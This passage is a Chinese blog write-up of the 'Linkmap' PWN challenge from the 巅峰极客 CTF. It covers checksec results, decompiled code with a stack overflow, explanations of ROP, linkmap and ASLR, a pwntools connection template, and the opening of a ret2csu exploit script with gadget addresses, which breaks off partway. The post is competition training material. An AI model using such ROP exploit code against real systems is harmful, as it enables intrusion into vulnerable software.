<!DOCTYPE HTML>
<html lang="zh-CN">


<head>
    <meta charset="utf-8">
    <meta name="keywords" content="巅峰极客, DU-玉 渗透测试 CTF PWN 护网行动 公安联考 考研 ">
    <meta name="description" content="中国人民警察大学 | 电子取证 | 护网 | 二进制 ">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <meta name="renderer" content="webkit|ie-stand|ie-comp">
    <meta name="mobile-web-app-capable" content="yes">
    <meta name="format-detection" content="telephone=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <meta name="google-site-verification" content="pBWoGvVEP36FzzS4xIpoMejc5UKi3RKcxd9rWWcjiDg" />
    <!-- Global site tag (gtag.js) - Google Analytics -->


    <title>巅峰极客 | DU-玉</title>

    <link rel="icon" type="image/jpeg" href="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/hsy-head.jpg">

    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
    <link rel="stylesheet" type="text/css" href="/css/matery.css">
    <link rel="stylesheet" type="text/css" href="/css/my.css">

    <script src="/libs/jquery/jquery.min.js"></script>
    <link href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@400;900&display=swap" rel="stylesheet" media="print" onload="this.media='all'">
    <script>
    var _hmt = _hmt || [];
    (function() {
      var hm = document.createElement("script");
      hm.src = "https://hm.baidu.com/hm.js?aaa6c944b0ed07922901d7fc571a171d";
      var s = document.getElementsByTagName("script")[0]; 
      s.parentNode.insertBefore(hm, s);
    })();
    </script>
<meta name="generator" content="Hexo 6.3.0">
<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
<link rel="alternate" href="/atom.xml" title="DU-玉" type="application/atom+xml">
</head>




<body>
    <header class="navbar-fixed">
    <nav id="headNav" class="bg-color nav-transparent">
        <div id="navContainer" class="nav-wrapper container">
            <div class="brand-logo">
                <a href="/" class="waves-effect waves-light">
                    
                    <img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/hsy-head.jpg" class="logo-img" alt="LOGO">
                    
                    <span class="logo-span">DU-玉</span>
                </a>
            </div>
            

<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
<ul class="right nav-menu">
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/" class="waves-effect waves-light">
      
      <i class="fas fa-home" style="zoom: 0.6;"></i>
      
      <span>首页</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="" class="waves-effect waves-light">

      
      <i class="fas fa-archive" style="zoom: 0.6;"></i>
      
      <span>归档</span>
      <i class="fas fa-chevron-down" aria-hidden="true" style="zoom: 0.6;"></i>
    </a>
    <ul class="sub-nav menus_item_child ">
      
      <li>
        <a href="/archives">
          
          <i class="fas fa-paper-plane" style="margin-top: -20px; zoom: 0.6;"></i>
          
          <span>时轴</span>
        </a>
      </li>
      
      <li>
        <a href="/categories">
          
          <i class="fas fa-bookmark" style="margin-top: -20px; zoom: 0.6;"></i>
          
          <span>分类</span>
        </a>
      </li>
      
      <li>
        <a href="/tags">
          
          <i class="fas fa-tag" style="margin-top: -20px; zoom: 0.6;"></i>
          
          <span>标签</span>
        </a>
      </li>
      
    </ul>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="" class="waves-effect waves-light">

      
      <i class="fas fa-heartbeat" style="zoom: 0.6;"></i>
      
      <span>清单</span>
      <i class="fas fa-chevron-down" aria-hidden="true" style="zoom: 0.6;"></i>
    </a>
    <ul class="sub-nav menus_item_child ">
      
      <li>
        <a href="/List/music">
          
          <i class="fas fa-music" style="margin-top: -20px; zoom: 0.6;"></i>
          
          <span>音乐</span>
        </a>
      </li>
      
      <li>
        <a href="/List/galleries">
          
          <i class="fas fa-image" style="margin-top: -20px; zoom: 0.6;"></i>
          
          <span>相册</span>
        </a>
      </li>
      
      <li>
        <a href="/List/movies">
          
          <i class="fas fa-film" style="margin-top: -20px; zoom: 0.6;"></i>
          
          <span>视频</span>
        </a>
      </li>
      
    </ul>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/contact" class="waves-effect waves-light">
      
      <i class="fas fa-envelope" style="zoom: 0.6;"></i>
      
      <span>留言板</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/tools" class="waves-effect waves-light">
      
      <i class="fas fa-suitcase" style="zoom: 0.6;"></i>
      
      <span>百宝箱</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/Windows" class="waves-effect waves-light">
      
      <i class="fas fa-desktop" style="zoom: 0.6;"></i>
      
      <span>DU-玉分站</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/friends" class="waves-effect waves-light">
      
      <i class="fas fa-link" style="zoom: 0.6;"></i>
      
      <span>友链</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/about" class="waves-effect waves-light">
      
      <span>关于</span>
    </a>
    
  </li>
  
  <li>
    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
    </a>
  </li>
</ul>


<div id="mobile-nav" class="side-nav sidenav">

    <div class="mobile-head bg-color">
        
        <img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/hsy-head.jpg" class="logo-img circle responsive-img">
        
        <div class="logo-name">DU-玉</div>
        <div class="logo-desc">
            
            中国人民警察大学 | 电子取证 | 护网 | 二进制 
            
        </div>
    </div>

    

    <ul class="menu-list mobile-menu-list">
        
        <li class="m-nav-item">
	  
		<a href="/" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-home"></i>
			
			首页
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="javascript:;">
			
				<i class="fa-fw fas fa-archive"></i>
			
			归档
			<span class="m-icon"><i class="fas fa-chevron-right"></i></span>
		</a>
            <ul  style="background:  ;" >
              
                <li>

                  <a href="/archives " style="margin-left:75px">
				  
				   <i class="fa fas fa-paper-plane" style="position: absolute;left:50px" ></i>
			      
		          <span>时轴</span>
                  </a>
                </li>
              
                <li>

                  <a href="/categories " style="margin-left:75px">
				  
				   <i class="fa fas fa-bookmark" style="position: absolute;left:50px" ></i>
			      
		          <span>分类</span>
                  </a>
                </li>
              
                <li>

                  <a href="/tags " style="margin-left:75px">
				  
				   <i class="fa fas fa-tag" style="position: absolute;left:50px" ></i>
			      
		          <span>标签</span>
                  </a>
                </li>
              
            </ul>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="javascript:;">
			
				<i class="fa-fw fas fa-heartbeat"></i>
			
			清单
			<span class="m-icon"><i class="fas fa-chevron-right"></i></span>
		</a>
            <ul  style="background:  ;" >
              
                <li>

                  <a href="/List/music " style="margin-left:75px">
				  
				   <i class="fa fas fa-music" style="position: absolute;left:50px" ></i>
			      
		          <span>音乐</span>
                  </a>
                </li>
              
                <li>

                  <a href="/List/galleries " style="margin-left:75px">
				  
				   <i class="fa fas fa-image" style="position: absolute;left:50px" ></i>
			      
		          <span>相册</span>
                  </a>
                </li>
              
                <li>

                  <a href="/List/movies " style="margin-left:75px">
				  
				   <i class="fa fas fa-film" style="position: absolute;left:50px" ></i>
			      
		          <span>视频</span>
                  </a>
                </li>
              
            </ul>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/contact" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-envelope"></i>
			
			留言板
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/tools" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-suitcase"></i>
			
			百宝箱
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/Windows" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-desktop"></i>
			
			DU-玉分站
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/friends" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-link"></i>
			
			友链
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/about" class="waves-effect waves-light">
			
				<i class="fas fa-fw fa-link"></i>
			
			关于
		</a>
          
        </li>
        
        
        <li><div class="divider"></div></li>
        <li>
            <a href="https://poison-biao.github.io/" class="waves-effect waves-light" target="_blank">
                <i class="fab fa-github-square fa-fw"></i>github
            </a>
        </li>
        
    </ul>
</div>


        </div>

        
            <style>
    .nav-transparent .github-corner {
        display: none !important;
    }

    .github-corner {
        position: absolute;
        z-index: 10;
        top: 0;
        right: 0;
        border: 0;
        transform: scale(1.1);
    }

    .github-corner svg {
        color: #0f9d58;
        fill: #fff;
        height: 64px;
        width: 64px;
    }

    .github-corner:hover .octo-arm {
        animation: a 0.56s ease-in-out;
    }

    .github-corner .octo-arm {
        animation: none;
    }

    @keyframes a {
        0%,
        to {
            transform: rotate(0);
        }
        20%,
        60% {
            transform: rotate(-25deg);
        }
        40%,
        80% {
            transform: rotate(10deg);
        }
    }
</style>

<a href="https://poison-biao.github.io/" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
   data-tooltip="github" data-position="left" data-delay="50">
    <svg viewBox="0 0 250 250" aria-hidden="true">
        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
              fill="currentColor" class="octo-body"></path>
    </svg>
</a>
        
    </nav>

</header>

    
<script src="/libs/cryptojs/crypto-js.min.js"></script>
<script>
    (function() {
        let pwd = '';
        if (pwd && pwd.length > 0) {
            if (pwd !== CryptoJS.SHA256(prompt('你干嘛，DU-玉基本不可能会给外人密码的，偷看隐私可不好哦 ~')).toString(CryptoJS.enc.Hex)) {
                alert('猜密码是猜不到的哟，找DU-玉要正确的密码吧 ~');
                location.href = '/';
            }
        }
    })();
</script>




<div class="bg-cover pd-header post-cover" style="background-image: url('https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/peakedness.png')">
    <div class="container" style="right: 0px;left: 0px;">
        <div class="row">
            <div class="col s12 m12 l12">
                <div class="brand">
                    <h1 class="description center-align post-title">巅峰极客</h1>
                </div>
            </div>
        </div>
    </div>
</div>




<main class="post-container content">

    
    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
<style>
    #articleContent h1::before,
    #articleContent h2::before,
    #articleContent h3::before,
    #articleContent h4::before,
    #articleContent h5::before,
    #articleContent h6::before {
        display: block;
        content: " ";
        height: 100px;
        margin-top: -100px;
        visibility: hidden;
    }

    #articleContent :focus {
        outline: none;
    }

    .toc-fixed {
        position: fixed;
        top: 64px;
    }

    .toc-widget {
        background-color: white;
        width: 345px;
        padding-left: 20px;
        border-radius: 10px;
        box-shadow: 0 10px 35px 2px rgba(0, 0, 0, .15), 0 5px 15px rgba(0, 0, 0, .07), 0 2px 5px -5px rgba(0, 0, 0, .1) !important;
    }

    .toc-widget .toc-title {
        padding: 35px 0 15px 17px;
        font-size: 1.5rem;
        font-weight: bold;
        line-height: 1.5rem;
    }

    .toc-widget ol {
        padding: 0;
        list-style: none;
    }
    
    #toc-content {
        height: calc(100vh - 300px);
        overflow: scroll;

    }

    #toc-content ol {
        padding-left: 10px;
    }

    #toc-content ol li {
        padding-left: 10px;
    }

    #toc-content .toc-link:hover {
        color: #42b983;
        font-weight: 700;
        text-decoration: underline;
    }

    #toc-content .toc-link::before {
        background-color: transparent;
        max-height: 25px;

        position: absolute;
        right: 23.5vw;
        display: block;
    }

    #toc-content .is-active-link {
        color: #42b983;
    }

    #floating-toc-btn {
        position: fixed;
        right: 15px;
        bottom: 76px;
        padding-top: 15px;
        margin-bottom: 0;
        z-index: 998;
    }

    #floating-toc-btn .btn-floating {
        width: 48px;
        height: 48px;
        bottom: 120px;
    }

    #floating-toc-btn .btn-floating i {
        line-height: 48px;
        font-size: 1.4rem;
    }
</style>
<div class="row">
    <div id="main-content" class="col s12 m12 l9">
        <!-- 文章内容详情 -->
<div id="artDetail">
    <div class="card">
        <div class="card-content article-info">
            <div class="row tag-cate">
                <div class="col s7">
                    
                    <div class="article-tag">
                        
                            <a href="/tags/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/">
                                <span class="chip bg-color">巅峰极客</span>
                            </a>
                        
                    </div>
                    
                </div>
                <div class="col s5 right-align">
                    
                    <div class="post-cate">
                        <i class="fas fa-bookmark fa-fw icon-category"></i>
                        
                            <a href="/categories/CTF/" class="post-category">
                                CTF
                            </a>
                        
                    </div>
                    
                </div>
            </div>

            <div class="post-info">
                
                <div class="post-date info-break-policy">
                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
                    2023-07-22
                </div>
                

                
                <div class="post-date info-break-policy">
                    <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
                    2023-07-24
                </div>
                

                
                <div class="info-break-policy">
                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
                    8.3k
                </div>
                

                
                <div class="info-break-policy">
                    <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
                    31 分
                </div>
                

                
                    <div id="busuanzi_container_page_pv" class="info-break-policy">
                        <i class="far fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
                        <span id="busuanzi_value_page_pv"></span>
                    </div>
				
            </div>
        </div>
        <hr class="clearfix">

        
        <!-- 是否加载使用自带的 prismjs. -->
        <link rel="stylesheet" href="/libs/prism/prism.css">
        

        
        <!-- 代码块折行 -->
        <style type="text/css">
            code[class*="language-"], pre[class*="language-"] { white-space: pre-wrap !important; }
        </style>
        

        <div class="card-content article-card-content">
            <div id="articleContent">
                <p>都学半个月了，还是一个PWN打不出来、又是自闭的一天，快学，真的不想当师傅们的破绽啊，淦 QAQ……….</p>
<p><a target="_blank" rel="noopener" href="https://peekgeek.xctf.org.cn/race/dfjk">https://peekgeek.xctf.org.cn/race/dfjk</a></p>
<h2 id="一、PWN01-Linkmap"><a href="#一、PWN01-Linkmap" class="headerlink" title="一、PWN01 (Linkmap)"></a>一、PWN01 (Linkmap)</h2><h3 id="一、checksec"><a href="#一、checksec" class="headerlink" title="一、checksec"></a>一、checksec</h3><p><code>checksec</code> 的输出，这个命令是用来检查一个可执行文件的安全特性。从你给出的信息来看，该二进制文件有以下特性：</p>
<ul>
<li>Arch: amd64-64-little：程序的架构是 64 位的 AMD 或 x86。</li>
<li>Full RELRO：RELRO 是 RELocation Read-Only 的缩写，用于在程序运行期间保护某些程序内存段不被修改。全 RELRO 模式表示 GOT 表是只读的，防止了 overwrite attacks。</li>
<li>No canary found：这表明在栈上没有发现 stack canary，也就是说栈溢出保护未开启，这可能使程序容易受到 buffer overflow 攻击。</li>
<li>NX enabled：这表示内存中的 no-execute (NX) 位已启用。也就是说，将内存标记为数据并阻止执行，使得攻击者无法在数据段（例如堆或栈）中插入并执行 shellcode。</li>
<li>No PIE：PIE 是 Position Independent Executable 的缩写，如果没有开启，那么程序每次加载时，其位置将是固定的，否则每次程序运行时加载到内存的地址都会发生变化。不开启 PIE 使得程序易受到 Return Oriented Programming (ROP) 或 Jump Oriented Programming (JOP) 攻击。</li>
</ul>
<p>综上，从这个二进制文件的特性来看，该二进制文件可能最容易受到栈溢出攻击，因为没有开启 stack canary。同时，由于没有启用 PIE，使其也可能受到 ROP 或 JOP 攻击。</p>
<p>在做进一步的二进制漏洞利用时，应当首先试图探查这些可能的攻击方式，分析软件的详细行为，可能的漏洞和缓冲区溢出的地方。</p>
<h3 id="二、C源代码"><a href="#二、C源代码" class="headerlink" title="二、C源代码"></a>二、C源代码</h3><pre class="line-numbers language-c" data-language="c"><code class="language-c">// positive sp value has been detected, the output may be wrong!
// 检测到了正的sp值，输出可能是错误的！

void __fastcall __norestart start(__int64 a1, __int64 a2, void (*a3)(void))
// 定义一个不返回（__noreturn）的函数start，它接受两个__int64类型参数和一个函数指针参数。

{
  __int64 v3; // rax
  // 定义一个__int64类型的变量v3，表示rax寄存器。

  int v4; // esi
  // 定义一个整型变量v4，表示esi寄存器。

  __int64 v5; // [rsp-8h] [rbp-8h] BYREF
  // 定义一个__int64类型的变量v5，表示栈上的数据。

  char *retaddr; // [rsp+0h] [rbp+0h] BYREF
  // 定义一个字符型指针变量retaddr，表示返回地址。

  v4 = v5;
  // 将v5的值赋给v4。

  v5 = v3;
  // 将v3的值赋给v5。

  _libc_start_main(main, v4, &amp;retaddr, init, fini, a3, &amp;v5);
  // 调用_libc_start_main函数，将程序控制权转交给main函数，同时设定了程序的初始化和结束时的操作。

  __halt();
  // 执行停止指令，结束程序。
}
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<pre class="line-numbers language-c" data-language="c"><code class="language-c">// attributes: thunk
int __fastcall _libc_start_main(
        int (__fastcall *main)(int, char **, char **),
        int argc,
        char **ubp_av,
        void (*init)(void),
        void (*fini)(void),
        void (*rtld_fini)(void),
        void *stack_end)
{
  return __libc_start_main(main, argc, ubp_av, init, fini, rtld_fini, stack_end);
}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>





<pre class="line-numbers language-c" data-language="c"><code class="language-c">__int64 __fastcall main(__int64 a1, char **a2, char **a3)
{
  char buf[16]; // [rsp+0h] [rbp-10h] BYREF

  sub_40071B(a1, a2, a3);
  read(0, buf, 0x100uLL);
  return 0LL;
}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>





<pre class="line-numbers language-c" data-language="c"><code class="language-c">int sub_40071B()
{
  return setvbuf(stdin, 0LL, 2, 0LL);
}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p> <code>sub_40071B</code> 函数中，调用了 <code>setvbuf(stdin, 0LL, 2, 0LL);</code>，这个函数调用设置了 <code>stdin</code> 的缓冲方式为无缓冲（<code>_IONBF</code>，对应的值为2），并且没有为其指定自定义的缓冲区（因为 <code>buffer</code> 参数为 <code>NULL</code>）。</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c">// attributes: thunk
int setvbuf(FILE *stream, char *buf, int modes, size_t n)
{
  return __imp_setvbuf(stream, buf, modes, n);
}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><code>setvbuf</code> 函数只是简单地调用了 <code>__imp_setvbuf</code> 函数。这是一个典型的转发函数（thunk），它的功能只是将函数调用转发给另一个函数。这样的设计常常是因为存在库函数被别的库函数替代的情况，或者为了实现一些特定的编程模式，例如动态链接或者延迟加载等。</p>
<p>在这个函数中，<code>__imp_setvbuf</code> 函数应该与标准的 <code>setvbuf</code> 函数具有相同的功能，也就是设置给定文件流的缓冲模式。这个函数的参数意义如下：</p>
<ul>
<li><code>stream</code>：这是一个 <code>FILE *</code> 类型的指针，表示要设置缓冲模式的文件流。</li>
<li><code>buf</code>：这是一个 <code>char *</code> 类型的指针，表示要设置的缓冲区。如果这个参数为 <code>NULL</code>，那么系统会自动管理缓冲区。</li>
<li><code>modes</code>：这是一个 <code>int</code> 类型的变量，用来设置缓冲模式。这个参数可以是 <code>_IOFBF</code>（完全缓冲）、<code>_IOLBF</code>（行缓冲）或者 <code>_IONBF</code>（无缓冲）中的一个。</li>
<li><code>n</code>：这是一个 <code>size_t</code> 类型的变量，表示缓冲区的大小。</li>
</ul>
<pre class="line-numbers language-c" data-language="c"><code class="language-c">void __fastcall init(unsigned int a1, __int64 a2, __int64 a3)
{
  signed __int64 v4; // rbp
  __int64 i; // rbx

  v4 = &amp;off_600DF0 - off_600DE8;
  init_proc();
  if ( v4 )
  {
    for ( i = 0LL; i != v4; ++i )
      ((void (__fastcall *)(_QWORD, __int64, __int64))off_600DE8[i])(a1, a2, a3);
  }
}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<p>如果 <code>v4</code> 不为零（即 <code>&amp;off_600DF0 - off_600DE8</code> 不为零），它将会在一个循环中执行一系列函数。这些函数的地址被保存在 <code>off_600DE8</code> 开始的地址空间中。</p>
<p>它使用了三个参数 <code>a1</code>, <code>a2</code>, 和 <code>a3</code>，这些参数在循环中被传递给每一个被调用的函数。因为我们没有这些函数的具体信息，我们无法得知这些参数的具体用途。</p>
<p>这个函数可能是在程序初始化时被调用的，用来执行一系列的初始化操作。如果 <code>&amp;off_600DF0 - off_600DE8</code> 不为零，那么就会有一系列的函数被调用，每一个函数的地址被保存在 <code>off_600DE8</code> 开始的地址空间中。这是一种常见的程序设计模式，例如在C++中的全局对象构造函数或者静态初始化就会使用类似的机制。</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c">void *init_proc()
{
  void *result; // rax

  result = &amp;__gmon_start__;
  if ( &amp;__gmon_start__ )
    return (void *)_gmon_start__();
  return result;
}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><code>init_proc</code> 函数在这里看起来主要是关于gmon的相关操作。gmon是GNU Profiling程序的一部分，它用于收集程序执行过程中的一些统计信息，以便于分析程序的性能。</p>
<p><code>__gmon_start__</code> 是在gmon中使用的特殊符号，当链接了gmon库时，<code>__gmon_start__</code> 会被定义。当程序启动时，如果 <code>__gmon_start__</code> 已经被定义，那么会自动调用 <code>__gmon_start__</code> 函数，开始收集性能统计信息。</p>
<p>在 <code>init_proc</code> 函数中，它首先检查 <code>__gmon_start__</code> 是否已经被定义，如果已经定义，就调用 <code>_gmon_start__()</code> 函数，否则什么都不做。</p>
<h3 id="解析"><a href="#解析" class="headerlink" title="解析"></a>解析</h3><p>这个问题涉及到一个称为 “linkmap” 的技术。在 Linux 中，linkmap 是一个数据结构，用于在加载动态库时存储有关库的信息。当一个程序加载多个动态库时，会有一个 linkmap 链表来存储这些库的信息。</p>
<p>由于这个程序存在栈溢出漏洞，并且开启了 NX，没有开启 PIE，所以可以使用 ROP（Return-oriented programming）来构造攻击。而 “linkmap” 的技术则可以帮助我们找到动态库中函数的地址，从而绕过 ASLR。</p>
<p>构造攻击代码需要对具体的二进制程序进行详细分析，我们需要知道如何利用 linkmap 来获取函数地址，以及如何利用栈溢出来控制程序执行流程。另外，需要注意的是，网络连接的代码可能需要根据实际环境进行修改。</p>
<p>下面是一个基本的 Python 代码模板，使用 pwntools 库来连接到远程服务。这个模板尚未包含具体的攻击代码，你需要根据实际的二进制程序来完成攻击代码的编写：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *

def exploit():
    # 连接到远程服务
    conn = remote("pwn-5bdeb2b31c.challenge.xctf.org.cn", 9999, ssl=True)

    # 这里添加你的攻击代码，例如发送一个包含 ROP 链的字符串

    # 让程序继续执行，直到结束或者触发一个异常
    conn.interactive()

if __name__ == "__main__":
    exploit()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>在这个模板中，你需要在 <code># 这里添加你的攻击代码</code> 的位置编写攻击代码，然后通过 <code>conn.send</code> 或者 <code>conn.sendline</code> 发送攻击代码。具体的攻击代码需要根据二进制程序的细节来编写。</p>
<ul>
<li><p>“栈溢出漏洞”：这是指由于程序没有正确的检查输入的长度，导致可以向一个栈分配的缓冲区写入过多的数据，从而覆盖其他在栈上的数据。在你的程序中，这种情况发生在 <code>main</code> 函数中，当程序尝试从标准输入读取256字节的数据并将其存储在一个只有16字节的缓冲区中。</p>
</li>
<li><p>“NX”：这是一个安全机制，全称为 “No eXecute”，也被称为 “Data Execution Prevention (DEP)”。启用了 NX 之后，程序不能执行存储在数据段（如堆和栈）的代码。这使得攻击者不能简单地向缓冲区写入一段代码然后执行。</p>
</li>
<li><p>“没有开启 PIE”：PIE 是 “Position Independent Executable” 的缩写。如果没有启用 PIE，那么程序每次执行时都会被加载到同一个内存地址。这使得攻击者可以预知代码段的地址，这在进行ROP攻击时是非常有用的。</p>
</li>
<li><p>“ROP（Return-oriented programming）”：这是一种利用已经存在于内存中的代码片段（称为 “gadgets”）来绕过NX的技术。由于程序的代码段是可执行的，攻击者可以通过修改栈上的返回地址，让程序执行代码段中的一段代码，然后返回，再执行另一段代码，以此类推。</p>
</li>
<li><p>“linkmap”：在 Linux 中，当一个动态库被加载时，会有一个称为 “linkmap” 的数据结构来存储有关该库的信息。这个数据结构中包含了动态库的加载地址，以及一些其他的信息。攻击者可以通过读取和解析这个数据结构，来找到动态库中函数的实际地址，从而绕过地址随机化（ASLR）。</p>
</li>
<li><p>“ASLR”：这是 “Address Space Layout Randomization” 的缩写，是一个安全机制，它会在每次程序执行时随机化内存的布局，使得攻击者不能预知代码和数据的地址。然而，由于你的程序没有启用 PIE，并且动态库的加载地址可以通过解析 linkmap 来获取，所以攻击者可以绕过 ASLR。</p>
</li>
</ul>
<h3 id="ret2csu-exp-py（非预期）"><a href="#ret2csu-exp-py（非预期）" class="headerlink" title="ret2csu  -  exp.py（非预期）"></a>ret2csu  -  exp.py（非预期）</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import* # 导入pwn库，包含了大量的工具来创建和交互与远程服务或者本地进程，便于二进制漏洞利用

context.log_level='debug' # 设置日志级别为debug，这样程序会打印出所有的交互数据
context.arch='amd64' # 设置目标的架构为amd64

s = lambda data : p.send(data) # 定义函数s，发送数据到目标
sl = lambda data : p.sendline(data) # 定义函数sl，发送数据到目标并附带一个换行符
sa = lambda text, data : p.sendafter(text, data) # 定义函数sa，等待接收到特定的文本后发送数据
sla = lambda text, data : p.sendlineafter(text, data) # 定义函数sla，等待接收到特定的文本后发送数据并附带一个换行符
r = lambda : p.recv() # 定义函数r，接收数据
rn = lambda x  : p.recvn(x) # 定义函数rn，接收指定数量的数据
ru = lambda text : p.recvuntil(text) # 定义函数ru，接收数据直到接收到特定的文本
dbg = lambda text=None  : gdb.attach(p, text) # 定义函数dbg，附加gdb到目标进程
uu32 = lambda : u32(p.recvuntil(b"\xf7")[-4:].ljust(4, b'\x00')) # 定义函数uu32，接收数据并转换为32位无符号整数
uu64 = lambda : u64(p.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00")) # 定义函数uu64，接收数据并转换为64位无符号整数
lg = lambda s : log.info('\033[1;31;40m %s --&gt; 0x%x \033[0m' % (s, eval(s))) # 定义函数lg，打印带有颜色的日志信息
pr = lambda s : print('\033[1;31;40m %s --&gt; 0x%x \033[0m' % (s, eval(s))) # 定义函数pr，打印带有颜色的字符串

# 定义函数mydbg，附加gdb并连接到ida进行远程调试
def mydbg():
  gdb.attach(p,"decompiler connect ida --host 192.168.1.102 --port 3662 ")
  pause()

# 定义一些在ROP攻击中需要用到的地址
pop_rdi=0x00000000004007e3
pop_rsi=0x00000000004007e1
bss_0601040=0x0601040
pop_rsp=0x00000000004007dd
read_plt=0x4004E0
read_got=0x600FD8
pop6_addr=0x4007DA
mov_addr=0x04007C0
bss_addr=0x601200
ret=0x00000000004004c9

i=0 # 初始化变量i为0
while True: # 死循环
    try:
        lg("i") # 打印日志信息，输出i的值
        i=i+1 # i加1

        # p=remote("pwn-1f975f76e2.challenge.xctf.org.cn", 9999, ssl=True) # 连接远程服务
        p=process('./ezzzz') # 启动本地进程
        elf=ELF('./ezzzz') # 打开本地的ELF文件
        libc=elf.libc # 获取本地的libc库

